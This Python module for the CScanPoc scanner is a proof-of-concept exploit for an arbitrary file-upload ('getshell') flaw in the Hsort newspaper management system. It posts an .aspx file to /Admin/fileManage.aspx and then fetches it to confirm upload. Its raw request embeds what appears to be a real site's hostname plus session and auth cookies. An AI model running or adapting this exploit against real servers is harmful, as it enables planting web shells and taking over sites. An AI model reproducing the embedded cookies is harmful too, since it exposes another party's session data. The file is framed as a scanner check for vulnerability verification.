# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Hsort_0000'  # 平台漏洞编号，留空
    name = 'Hsort报刊管理系统getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-12-2'  # 漏洞公布时间
    desc = '''
        Hsort报刊管理系统getshell.
        /Admin/fileManage.aspx?action=UPLOAD&value1=~/
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3756/'  # 漏洞来源https://bugs.shuimugan.com/bug/view?bug_no=0141695
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hsort'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c3d05f96-2bed-4191-9d52-ff460e38236e'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = 'Admin/fileManage.aspx?action=UPLOAD&value1=~/'
            target = arg + payload
            raw = """POST /Admin/fileManage.aspx?action=UPLOAD&value1=~/ HTTP/1.1
Host: paper.deqingroup.com
Proxy-Connection: keep-alive
Content-Length: 268
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://**.**.**.**
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzU8cYAkiaOHkm3gA
Referer: http://paper.deqingroup.com/Admin/HsortWebExplorer.aspx
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,ja;q=0.2
Cookie: menuitems=1_1%2C2_1%2C3_1%2C6_1%2C7_1%2C8_1; ASPSESSIONIDAQQCCTAS=MDPBIBFCNNGPEMMPIKBIFAEO; ASP.NET_SessionId=cqz2nw450qlxni254ihyh03w; ImageV=QTB5K; userID=8; .ASPXAUTH=C64B54127984EDB2B5EC27C4379C52D8C9DEEA8E35777741B4143F50E45AB5BA00647DD9D604E701535E52FC2DDD938A9312D474008E92FB15887C22E8F2840C16BEDDD4A6ADC8C7; LWSysUserName=admin

------WebKitFormBoundaryzU8cYAkiaOHkm3gA
Content-Disposition: form-data; name=\"selectFile\"; filename=\"naiquan.aspx\"
Content-Type: application/octet-stream

getshell!!!
------WebKitFormBoundaryzU8cYAkiaOHkm3gA--"""
            code, head, res, errcode, _ = hh.http(target, raw=raw)
            shell_path = arg + "naiquan.aspx"
            code1, head1, res1, errcode1, _ = hh.http(shell_path)
            if code == 200 and code1 == 200 and "OK" in res and "getshell!!!" in res1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
